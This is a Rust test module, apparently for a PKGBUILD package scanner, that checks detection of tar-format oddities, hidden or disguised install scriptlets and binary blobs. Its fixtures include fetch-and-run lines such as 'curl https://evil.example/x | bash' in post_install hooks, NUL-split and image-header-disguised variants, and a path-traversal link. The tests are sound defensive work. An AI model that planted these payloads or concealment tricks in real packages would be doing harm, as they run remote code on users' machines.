    fn plain_gnu_and_posix_tars_are_quiet() {
        let t = tar_bytes(&[("a.txt", b"hi\n"), ("sub/b.txt", b"yo\n")]);
        let p = parse_tar(&t).unwrap();
        assert!(p.oddities.is_empty(), "{:?}", p.oddities);
        assert_eq!(p.members.len(), 2);
        let mut g = tar_bytes(&[("a.txt", b"hi\n")]);
        g[257..265].copy_from_slice(b"ustar  \0");
        retar_sum(&mut g, 0, false);
        let p = parse_tar(&g).unwrap();
        assert!(p.oddities.is_empty(), "{:?}", p.oddities);
    }

    #[test]
    fn unusual_typeflags_are_high_and_still_scanned() {
        for &flag in b"ZSDV" {
            let t = tar_with_flag(flag, PAYLOAD);
            let p = parse_tar(&t).unwrap();
            assert_eq!(p.members.len(), 1, "{flag}");
            assert!(has_odd(&p, "type flag"), "{flag}");
        }
        let t = tar_with_flag(b'Z', PAYLOAD);
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(a.tar)\n";
        let (f, _d) = collect_with(&[("a.tar", &t)], text);
        assert!(f.side.iter().any(|s| s.content.contains("evil.example")));
        let hit = f.findings.iter().find(|x| x.id == TAR_ODD_CODE).unwrap();
        assert_eq!(hit.severity, Severity::High);
    }

    #[test]
    fn structures_where_readers_disagree_are_flagged() {
        // trailing-slash regular file carrying data
        let t = tar_bytes(&[("dir/", PAYLOAD)]);
        assert!(has_odd(&parse_tar(&t).unwrap(), "directory name"));
        // device / hardlink / directory entries with size > 0
        for &flag in b"346125" {
            let p = parse_tar(&tar_with_flag(flag, PAYLOAD)).unwrap();
            assert!(!p.oddities.is_empty(), "{flag}");
            assert_eq!(p.members.len(), 1, "{flag}");
        }
        // a symlink and a directory with no data are fine
        let mut ok = tar_bytes(&[("l", b"")]);
        ok[156] = b'2';
        retar_sum(&mut ok, 0, false);
        assert!(parse_tar(&ok).unwrap().oddities.is_empty());
        // '+' in a numeric field, base-256 size
        let mut plus = tar_bytes(&[("a.txt", b"hi\n")]);
        plus[124..136].copy_from_slice(b"+0000000003\0");
        retar_sum(&mut plus, 0, false);
        assert!(has_odd(&parse_tar(&plus).unwrap(), "size field"));
        let mut b256 = tar_bytes(&[("a.txt", b"hi\n")]);
        b256[124] = 0x80;
        retar_sum(&mut b256, 0, false);
        assert!(has_odd(&parse_tar(&b256).unwrap(), "size field"));
        // duplicate names
        let dup = tar_bytes(&[("a.txt", b"one\n"), ("a.txt", b"two\n")]);
        assert!(has_odd(&parse_tar(&dup).unwrap(), "duplicate"));
        // v7 header (no magic)
        let mut v7 = tar_bytes(&[("a.txt", b"hi\n")]);
        v7[257..265].copy_from_slice(&[0u8; 8]);
        retar_sum(&mut v7, 0, false);
        assert!(has_odd(&parse_tar(&v7).unwrap(), "magic"));
    }

    fn pax_tar(recs: &[u8], then: &[u8]) -> Vec<u8> {
        let mut x = tar_bytes(&[("PaxHeaders/x", recs)]);
        x.truncate(512 + recs.len().div_ceil(512) * 512);
        x[156] = b'x';
        retar_sum(&mut x, 0, false);
        x.extend_from_slice(then);
        x
    }

    #[test]
    fn pax_size_is_honoured_and_strict() {
        // ustar size 0, pax size=512: bsdtar reads the next block as content.
        let mut hdr = tar_bytes(&[("build.sh", b"")]);
        hdr.truncate(512);
        let mut hidden = vec![0u8; 512];
        hidden[..PAYLOAD.len()].copy_from_slice(PAYLOAD);
        let mut rest = hdr.clone();
        rest.extend_from_slice(&hidden);
        rest.extend_from_slice(&[0u8; 1024]);
        let t = pax_tar(b"12 size=512\n", &rest);
        let p = parse_tar(&t).unwrap();
        assert!(p.oddities.is_empty(), "{:?}", p.oddities);
        assert_eq!(p.members.len(), 1);
        assert!(String::from_utf8_lossy(&p.members[0].1).contains("evil.example"));
        // '+' in a pax decimal, unknown keys, global headers
        let plus = pax_tar(b"13 size=+512\n", &rest);
        assert!(!parse_tar(&plus).unwrap().oddities.is_empty());
        let unk = pax_tar(b"13 foo.bar=1\n", &rest);
        assert!(has_odd(&parse_tar(&unk).unwrap(), "pax key"));
        let mut g = pax_tar(b"12 size=512\n", &rest);
        g[156] = b'g';
        retar_sum(&mut g, 0, false);
        assert!(has_odd(&parse_tar(&g).unwrap(), "global"));
    }

    #[test]
    fn signed_checksum_and_gnu_magic_prefix() {
        let mut t = tar_bytes(&[("build.sh", PAYLOAD)]);
        t[100] = 0xff; // makes the signed and unsigned sums differ
        retar_sum(&mut t, 0, true);
        assert!(tar_header_ok(&t[..512]));
        assert_eq!(parse_tar(&t).unwrap().members.len(), 1);
        // GNU `ustar  ` header: bytes 345.. are atime/ctime, not a path prefix.
        let mut g = tar_bytes(&[("build.sh", PAYLOAD)]);
        g[257..265].copy_from_slice(b"ustar  \0");
        g[345..350].copy_from_slice(b"12345");
        retar_sum(&mut g, 0, false);
        let p = parse_tar(&g).unwrap();
        assert_eq!(p.members[0].0, "build.sh");
    }

    #[test]
    fn gnu_longlink_is_handled() {
        let mut k = tar_bytes(&[("././@LongLink", b"../../etc/x\0")]);
        k.truncate(1024);
        k[156] = b'K';
        retar_sum(&mut k, 0, false);
        let mut link = tar_bytes(&[("l", b"")]);
        link.truncate(512);
        link[156] = b'2';
        retar_sum(&mut link, 0, false);
        k.extend_from_slice(&link);
        k.extend_from_slice(&[0u8; 1024]);
        let p = parse_tar(&k).unwrap();
        assert!(p.escapes.iter().any(|e| e.contains("../../etc/x")));
    }

    #[test]
    fn end_of_archive_must_be_clean() {
        let mut t = tar_bytes(&[("a.txt", b"hi\n")]);
        t.extend_from_slice(b"hidden second archive");
        assert!(has_odd(&parse_tar(&t).unwrap(), "after the end"));
        // zero padding to the 10240-byte record is not trailing data
        let mut padded = tar_bytes(&[("a.txt", b"hi\n")]);
        padded.resize(10240, 0);
        assert!(parse_tar(&padded).unwrap().oddities.is_empty());
        // a single zero block followed by another entry
        let a = tar_bytes(&[("a.txt", b"hi\n")]);
        let b = tar_bytes(&[("b.txt", b"yo\n")]);
        let mut mid = a[..a.len() - 1024].to_vec();
        mid.extend_from_slice(&[0u8; 512]);
        mid.extend_from_slice(&b);
        assert!(has_odd(&parse_tar(&mid).unwrap(), "middle"));
    }

    #[test]
    fn more_archive_formats_are_recognised() {
        let d = tempfile::tempdir().unwrap();
        let w = |n: &str, b: &[u8]| {
            std::fs::write(d.path().join(n), b).unwrap();
            archive_kind(&d.path().join(n))
        };
        assert_eq!(w("a", &[0x5d, 0, 0, 0x80, 0]), Some("lzma"));
        assert_eq!(w("b", b"LZIP\x01"), Some("lzip"));
        assert_eq!(w("c", &[0x1f, 0x9d, 0x90]), Some("compress"));
        assert_eq!(w("d", b"Rar!\x1a\x07\x00"), Some("rar"));
        assert_eq!(w("e", b"MSCF\0\0\0\0"), Some("cab"));
        assert_eq!(w("f", b"xar!\0\x1c"), Some("xar"));
        assert_eq!(w("g", b"070701000000"), Some("cpio"));
        assert_eq!(w("h", &[0xc7, 0x71, 0, 0]), Some("cpio"));
        let mut iso = vec![0u8; 0x8006];
        iso[0x8001..0x8006].copy_from_slice(b"CD001");
        assert_eq!(w("i", &iso), Some("iso9660"));
    }

    #[test]
    fn nul_bearing_local_source_is_scan002_unless_plain_media() {
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(blob.dat logo.png)\n";
        let blob = [0u8, 1, 2, 3, 0, 0, 0, 0xff, 0xfe, 0, 0, 0, 0, 0, 0, 0];
        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
        png.extend_from_slice(&[0u8; 32]);
        let (f, _d) = collect_with(&[("blob.dat", &blob), ("logo.png", &png)], text);
        let hits: Vec<_> = f
            .findings
            .iter()
            .filter(|x| x.id == OPAQUE_ARCHIVE_CODE)
            .collect();
        assert_eq!(hits.len(), 1, "{:?}", f.findings);
        assert!(hits[0].location.file.ends_with("blob.dat"));
    }

    #[test]
    fn nul_bearing_text_source_is_reported_not_dropped() {
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(fix.dat)\n";
        let (f, _d) = collect_with(
            &[("fix.dat", b"cu\0rl https://evil.example/x | sh\n")],
            text,
        );
        assert!(f.findings.iter().any(|x| x.id == OPAQUE_ARCHIVE_CODE));
        // A script-named file with NULs is still read, NULs stripped.
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(fix.sh)\n";
        let (f, _d) = collect_with(&[("fix.sh", b"cu\0rl https://evil.example/x | sh\n")], text);
        assert!(f
            .side
            .iter()
            .any(|s| s.content.contains("curl https://evil.example")));
    }

    #[test]
    fn for_loops_and_build_code_do_not_make_install_unresolved() {
        let text = "pkgname=demo\npkgver=1\npkgrel=1\ninstall=demo.install\n\
                    build() {\n  eval \"$(true)\"\n  for r in install/rules.d/*.toml; do :; done\n}\n\
                    package() {\n  for _rule in install/rules.d/*.toml; do :; done\n}\n";
        let (f, _d) = collect_with(&[("demo.install", b"post_install() { :; }\n")], text);
        assert!(f.findings.is_empty(), "{:?}", f.findings);
    }

    #[test]
    fn binary_tar_data_is_quiet_but_an_executable_is_not() {
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(a.tar)\n";
        let der = [0x30u8, 0x82, 0, 4, 0x80, 0x81, 0x82, 0x83];
        let t = tar_bytes(&[("vec.der", &der)]);
        let (f, _d) = collect_with(&[("a.tar", &t)], text);
        assert!(f.findings.is_empty(), "{:?}", f.findings);
        let t = tar_bytes(&[("tool", b"\x7fELF\x02\x01\x01\0\0\0")]);
        let (f, _d) = collect_with(&[("a.tar", &t)], text);
        assert!(f.findings.iter().any(|x| x.id == OPAQUE_ARCHIVE_CODE));
    }

    #[test]
    fn scriptlet_function_files_are_also_scanned_as_scriptlets() {
        let text = "pkgname=d\npkgver=1\npkgrel=1\n";
        for body in [
            "post_install() {\n  :\n}\n",
            "function pre_upgrade {\n  :\n}\n",
            "post_\"install\"() { :; }\n",
            "x=1; post_remove() { :; }\n",
        ] {
            let (f, _d) = collect_with(&[("tool", body.as_bytes())], text);
            assert!(
                f.side
                    .iter()
                    .any(|s| s.path.ends_with("tool") && s.file_type == FileType::InstallScript),
                "{body}"
            );
            assert!(f
                .side
                .iter()
                .any(|s| s.path.ends_with("tool") && s.file_type == FileType::SourceFile));
        }
        // Changelogs, CI files and helpers that merely mention curl are not.
        let (f, _d) = collect_with(
            &[
                ("update.sh", b"curl -fsSL https://x.example | sha256sum\n"),
                ("NEWS", b"use `post_install` carefully\n"),
            ],
            text,
        );
        assert!(f.side.iter().all(|s| s.file_type == FileType::SourceFile));
    }

    #[test]
    fn scriptlet_typing_does_not_depend_on_install_resolution() {
        // `eval "ins""tall=..."` defeats every textual model of the assignment;
        // the payload file is still scanned as a scriptlet.
        let text = "pkgname=d\npkgver=1\npkgrel=1\neval \"ins\"\"tall=demo.scr\"\n";
        let (f, _d) = collect_with(&[("demo.scr", b"post_install() { :; }\n")], text);
        assert!(f
            .side
            .iter()
            .chain(f.install.iter())
            .any(|s| s.path.ends_with("demo.scr") && s.file_type == FileType::InstallScript));
        // Also in a subdirectory.
        let d = tempfile::tempdir().unwrap();
        std::fs::write(d.path().join("PKGBUILD"), text).unwrap();
        std::fs::create_dir_all(d.path().join("a/b")).unwrap();
        std::fs::write(d.path().join("a/b/x.scr"), "post_install() { :; }\n").unwrap();
        let f = collect(d.path(), &pkg(text));
        assert!(f
            .side
            .iter()
            .any(|s| s.path.ends_with("x.scr") && s.file_type == FileType::InstallScript));
    }

    #[test]
    fn the_whole_tree_is_read_without_references() {
        let d = tempfile::tempdir().unwrap();
        let text = "pkgname=d\npkgver=1\npkgrel=1\n";
        std::fs::write(d.path().join("PKGBUILD"), text).unwrap();
        let deep = d.path().join("a/b/c/d/e/f");
        std::fs::create_dir_all(&deep).unwrap();
        std::fs::write(deep.join("h.sh"), "curl https://evil.example/x | sh\n").unwrap();
        std::fs::create_dir_all(d.path().join(".git/objects")).unwrap();
        std::fs::write(d.path().join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
        std::fs::write(
            d.path().join(".git/ignored"),
            "curl https://evil.example/y\n",
        )
        .unwrap();
        let f = collect(d.path(), &pkg(text));
        assert!(f.side.iter().any(|s| s.content.contains("evil.example/x")));
        assert!(f.side.iter().all(|s| !s.content.contains("evil.example/y")));
        assert!(f.findings.is_empty(), "{:?}", f.findings);
    }

    #[test]
    fn a_tree_past_the_bounds_is_scan001_critical() {
        let d = tempfile::tempdir().unwrap();
        let text = "pkgname=d\npkgver=1\npkgrel=1\n";
        std::fs::write(d.path().join("PKGBUILD"), text).unwrap();
        let mut deep = d.path().to_path_buf();
        for i in 0..(MAX_TREE_DEPTH + 2) {
            deep = deep.join(format!("d{i}"));
        }
        std::fs::create_dir_all(&deep).unwrap();
        std::fs::write(deep.join("x.sh"), "echo hi\n").unwrap();
        let f = collect(d.path(), &pkg(text));
        let hit = f
            .findings
            .iter()
            .find(|x| x.id == UNANALYZABLE_CODE && x.description.contains("too large"))
            .expect("depth bound must be SCAN-001");
        assert_eq!(hit.severity, Severity::Critical);
    }

    #[test]
    fn binary_files_anywhere_are_scanned_and_reported_not_dropped() {
        let d = tempfile::tempdir().unwrap();
        let text = "pkgname=d\npkgver=1\npkgrel=1\n";
        std::fs::write(d.path().join("PKGBUILD"), text).unwrap();
        std::fs::create_dir_all(d.path().join("sub")).unwrap();
        let mut blob = b"\x7fELF\0\0\0\0".to_vec();
        blob.extend_from_slice(b"cu\0rl https://evil.example/x | sh\n");
        blob.extend_from_slice(&[0u8; 64]);
        std::fs::write(d.path().join("bin1"), &blob).unwrap();
        std::fs::write(d.path().join("sub/bin2"), &blob).unwrap();
        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
        png.extend_from_slice(&[0u8; 64]);
        std::fs::write(d.path().join("sub/logo.png"), &png).unwrap();
        let f = collect(d.path(), &pkg(text));
        let flagged: Vec<_> = f
            .findings
            .iter()
            .filter(|x| x.id == OPAQUE_ARCHIVE_CODE)
            .map(|x| {
                x.location
                    .file
                    .file_name()
                    .unwrap()
                    .to_string_lossy()
                    .into_owned()
            })
            .collect();
        assert_eq!(flagged.len(), 2, "{flagged:?}");
        assert!(f
            .side
            .iter()
            .any(|s| s.content.contains("curl https://evil.example")));
    }

    #[test]
    fn one_very_long_line_is_scanned_in_linear_time() {
        let long = "a=".repeat(70_000) + "\n" + &"install=".repeat(15_000) + "\n";
        let text = format!("pkgname=d\npkgver=1\npkgrel=1\n{long}");
        let p = pkg(&text);
        let t = std::time::Instant::now();
        let lines = lex_lines(&p.raw_content);
        let _ = build_census(&lines);
        let _ = find_install_decls(&lines);
        assert!(t.elapsed().as_secs() < 5, "took {:?}", t.elapsed());
    }

    #[test]
    fn quoted_heredoc_marker_does_not_swallow_the_rest() {
        let text = "pkgbase=demo\npkgname=(demo demo-b)\npkgver=1\npkgrel=1\n\
                    echo '<<EOF'\npackage_demo-b() {\n  install=$pkgname.scr\n}\n";
        let p = pkg(text);
        let decls = find_install_decls(&lex_lines(&p.raw_content));
        assert_eq!(decls.len(), 1, "{decls:?}");
        // numeric heredoc delimiter
        let text = "pkgname=d\npkgver=1\npkgrel=1\ncat <<1\nx\n1\ninstall=demo.scr\n";
        let p = pkg(text);
        assert_eq!(find_install_decls(&lex_lines(&p.raw_content)).len(), 1);
    }

    #[test]
    fn function_less_scriptlets_are_typed_under_every_package_name() {
        // The lexer attributes the one-line `package_demo-b` to nothing, so only
        // trying every package name finds demo-b.scr.
        let text = "pkgbase=demo\npkgname=(demo demo-b)\npkgver=1\npkgrel=1\n\
                    package_demo() { :; }\ntrue; package_demo-b() { install=$pkgname.scr; }\n";
        let (f, _d) = collect_with(
            &[
                ("demo.scr", b"echo benign\n"),
                ("demo-b.scr", b"npm install -g evilpkg\n"),
            ],
            text,
        );
        assert!(f
            .side
            .iter()
            .chain(f.install.iter())
            .any(|s| s.path.ends_with("demo-b.scr") && s.file_type == FileType::InstallScript));
        // A guessed name that does not exist says nothing.
        assert!(f.findings.is_empty(), "{:?}", f.findings);
    }

    #[test]
    fn install_named_and_install_mentioned_files_are_scriptlets() {
        let text = "pkgname=d\npkgver=1\npkgrel=1\neval \"install=$(echo q)zz.scr\"\ninstall -Dm755 other.sh /x\n";
        let (f, _d) = collect_with(
            &[
                ("zz.scr", b"npm install -g evilpkg\n"),
                ("X.INSTALL", b"npm install -g evilpkg\n"),
                ("other.sh", b"echo hi\n"),
            ],
            text,
        );
        let is_inst = |n: &str| {
            f.side
                .iter()
                .chain(f.install.iter())
                .any(|s| s.path.ends_with(n) && s.file_type == FileType::InstallScript)
        };
        assert!(is_inst("zz.scr"));
        assert!(is_inst("X.INSTALL"));
        // The coreutils `install -Dm755 file` command is not a mention.
        let sc = ParsedInstallScript {
            hooks: Vec::new(),
            content: "echo hi\n".into(),
            path: PathBuf::from("/x/other.sh"),
            file_type: FileType::SourceFile,
        };
        assert!(!also_scriptlet(&sc, &[], &HashSet::new()));
    }

    const EVIL_SCRIPTLET: &[u8] = b"post_install() {\n  curl -s https://evil.example/x | bash\n}\n";

    fn typed_install(f: &PackageFiles, name: &str) -> bool {
        f.side
            .iter()
            .chain(f.install.iter())
            .any(|s| s.path.ends_with(name) && s.file_type == FileType::InstallScript)
    }

    #[test]
    fn media_looking_names_and_headers_never_hide_a_scriptlet() {
        for (file, head) in [
            ("evil.sig", &b""[..]),
            ("evil.pem", &b""[..]),
            ("evil.asc", &b""[..]),
            ("evil.der", &b""[..]),
            ("evil.mo", &b""[..]),
            ("evil.install", &b"GIF89a\n"[..]),
            ("evil.png", &b"\x89PNG\r\n\x1a\n"[..]),
            ("evil.pdf", &b"%PDF-1.4\n"[..]),
        ] {
            let mut body = head.to_vec();
            body.extend_from_slice(EVIL_SCRIPTLET);
            let text = format!("pkgname=d\npkgver=1\npkgrel=1\ninstall={file}\n");
            let (f, _d) = collect_with(&[(file, &body)], &text);
            let s = f
                .side
                .iter()
                .chain(f.install.iter())
                .find(|s| s.path.ends_with(file))
                .unwrap_or_else(|| panic!("{file} was dropped"));
            assert!(s.content.contains("evil.example"), "{file}");
            assert!(typed_install(&f, file), "{file}");
        }
        // As a local source and as a tar member, too.
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(evil.pem)\n";
        let (f, _d) = collect_with(&[("evil.pem", EVIL_SCRIPTLET)], text);
        assert!(f.side.iter().any(|s| s.content.contains("evil.example")));
        let tar = tar_bytes(&[("x.pem", EVIL_SCRIPTLET)]);
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(a.tar)\n";
        let (f, _d) = collect_with(&[("a.tar", &tar)], text);
        assert!(f.side.iter().any(|s| s.content.contains("evil.example")));
    }

    #[test]
    fn real_media_is_scanned_quietly_and_binary_noise_is_reduced_to_strings() {
        let text = "pkgname=d\npkgver=1\npkgrel=1\n";
        let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
        let mut x = 0x9e37_79b9u32;
        png.extend((0..4096u32).map(|_| {
            x ^= x << 13;
            x ^= x >> 17;
            x ^= x << 5;
            if x % 3 == 0 {
                0
            } else {
                0x80 | (x >> 8) as u8
            }
        }));
        png.extend_from_slice(b"\0\0 curl -s https://evil.example/x | sh \0\0");
        let (f, _d) = collect_with(&[("logo.png", &png)], text);
        // Real image structure: no SCAN-002, content still read, noise dropped.
        assert!(f.findings.is_empty(), "{:?}", f.findings);
        let s = f
            .side
            .iter()
            .find(|s| s.path.ends_with("logo.png"))
            .unwrap();
        assert!(s.content.contains("evil.example"));
        assert!(s.content.len() < 200, "noise must not reach the rules");
        // The same bytes under a script name are not media.
        let (f, _d) = collect_with(&[("blob", &png[8..])], text);
        assert!(f.findings.iter().any(|x| x.id == OPAQUE_ARCHIVE_CODE));
        // A valid DER certificate is quiet; a "DER" that is not one is reported.
        let mut der = vec![0x30, 0x82, 0x01, 0x00];
        der.extend((0..256u32).map(|i| 0x80 | (i % 100) as u8));
        let (f, _d) = collect_with(&[("c.der", &der)], text);
        assert!(f.findings.is_empty(), "{:?}", f.findings);
        let (f, _d) = collect_with(&[("c.der", &der[..100])], text);
        assert!(f.findings.iter().any(|x| x.id == OPAQUE_ARCHIVE_CODE));
    }

    #[test]
    fn a_tar_that_fails_at_block_zero_is_scan004_high() {
        let mut t = tar_bytes(&[("a.txt", b"hi\n")]);
        t[0] = 0; // empty name: not a header, but the ustar magic is still there
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(a.tar)\n";
        let (f, _d) = collect_with(&[("a.tar", &t)], text);
        let hit = f.findings.iter().find(|x| x.id == TAR_ODD_CODE).unwrap();
        assert_eq!(hit.severity, Severity::High);
        assert!(f.findings.iter().all(|x| x.id != OPAQUE_ARCHIVE_CODE));
    }

    #[test]
    fn only_a_real_top_level_git_repo_is_skipped() {
        let text = "pkgname=d\npkgver=1\npkgrel=1\n";
        let mk = |setup: &dyn Fn(&Path)| {
            let d = tempfile::tempdir().unwrap();
            std::fs::write(d.path().join("PKGBUILD"), text).unwrap();
            setup(d.path());
            let f = collect(d.path(), &pkg(text));
            (f.side.iter().any(|s| s.content.contains("evil.example")), d)
        };
        let payload = "curl https://evil.example/x | sh\n";
        // real repo: skipped
        assert!(
            !mk(&|p| {
                std::fs::create_dir_all(p.join(".git/objects")).unwrap();
                std::fs::write(p.join(".git/HEAD"), "ref: x\n").unwrap();
                std::fs::write(p.join(".git/hook"), payload).unwrap();
            })
            .0
        );
        // fake top-level .git directory: scanned
        assert!(
            mk(&|p| {
                std::fs::create_dir_all(p.join(".git")).unwrap();
                std::fs::write(p.join(".git/hook"), payload).unwrap();
            })
            .0
        );
        // nested .git: scanned
        assert!(
            mk(&|p| {
                std::fs::create_dir_all(p.join("sub/.git/objects")).unwrap();
                std::fs::write(p.join("sub/.git/HEAD"), "ref: x\n").unwrap();
                std::fs::write(p.join("sub/.git/hook"), payload).unwrap();
            })
            .0
        );
        // top-level .git as a file: scanned
        assert!(mk(&|p| std::fs::write(p.join(".git"), payload).unwrap()).0);
    }
}
